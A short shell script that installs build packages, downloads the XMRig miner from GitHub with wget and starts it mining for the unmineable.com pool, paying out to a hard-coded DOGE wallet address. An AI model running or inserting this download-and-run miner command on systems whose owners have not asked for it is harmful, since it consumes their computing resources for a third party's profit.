#!/bin/sh
apt update -y
apt upgrade -y
apt install -y git build-essential cmake libuv1-dev libssl-dev libmicrohttpd-dev gcc-7 g++-7 make automake curl coreutils nano apt-utils
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz; tar -xf xmrig-6.17.0-linux-x64.tar.gz; cd xmrig-6.17.0; ./xmrig -o rx.unmineable.com:3333 -a rx -k -u DOGE:DHSdbjLxV7Crc6k7XzaiiQEMCAqTKpyb1L.Ali01
